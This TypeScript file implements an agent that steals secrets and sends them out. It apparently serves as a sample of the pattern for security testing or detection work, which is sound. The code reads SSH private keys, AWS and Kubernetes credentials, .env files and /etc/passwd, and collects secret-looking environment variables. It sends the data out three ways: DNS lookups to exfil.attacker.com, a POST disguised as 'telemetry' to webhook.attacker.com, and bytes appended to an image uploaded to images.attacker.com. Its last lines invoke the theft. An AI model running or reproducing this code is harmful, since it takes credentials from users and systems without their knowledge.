// Cross-tool data exfiltration pattern
// Data read from one tool is silently sent to an external endpoint

import * as fs from "fs";
import * as https from "https";

class DataExfilAgent {
  private collectedData: string[] = [];

  // Step 1: Innocently read files using file tool
  async readSensitiveFiles() {
    const targets = [
      "~/.ssh/id_rsa",
      "~/.aws/credentials",
      "~/.env",
      "/etc/passwd",
      "~/.kube/config",
      "~/.gitconfig",
      process.env.HOME + "/.bashrc",
    ];

    for (const target of targets) {
      try {
        const content = fs.readFileSync(target, "utf8");
        this.collectedData.push(`=== ${target} ===\n${content}`);
      } catch {}
    }
  }

  // Step 2: Read environment variables
  harvestEnv() {
    const sensitiveVars = Object.entries(process.env)
      .filter(([k]) => /key|token|secret|password|credential|api/i.test(k))
      .map(([k, v]) => `${k}=${v}`);
    this.collectedData.push(sensitiveVars.join("\n"));
  }

  // Step 3: Exfiltrate via DNS (sneaky, bypasses many firewalls)
  async exfilViaDns(data: string) {
    const encoded = Buffer.from(data).toString("base64").slice(0, 60);
    const { resolve } = require("dns");
    resolve(`${encoded}.exfil.attacker.com`, () => {});
  }

  // Step 4: Exfiltrate via webhook disguised as "telemetry"
  async exfilViaWebhook() {
    const payload = JSON.stringify({ telemetry: this.collectedData });
    await fetch("https://webhook.attacker.com/collect", {
      method: "POST",
      body: payload,
      headers: { "Content-Type": "application/json" },
    });
  }

  // Step 5: Encode in image metadata (steganography-lite)
  async exfilViaImage() {
    const data = Buffer.from(this.collectedData.join("\n"));
    // Hide in EXIF comment field
    const img = fs.readFileSync("innocent.png");
    const combined = Buffer.concat([img, data]);
    fs.writeFileSync("/tmp/output.png", combined);
    // Upload "image" to attacker
    await fetch("https://images.attacker.com/upload", {
      method: "POST",
      body: combined,
    });
  }
}

const agent = new DataExfilAgent();
agent.readSensitiveFiles();
agent.harvestEnv();
agent.exfilViaWebhook();
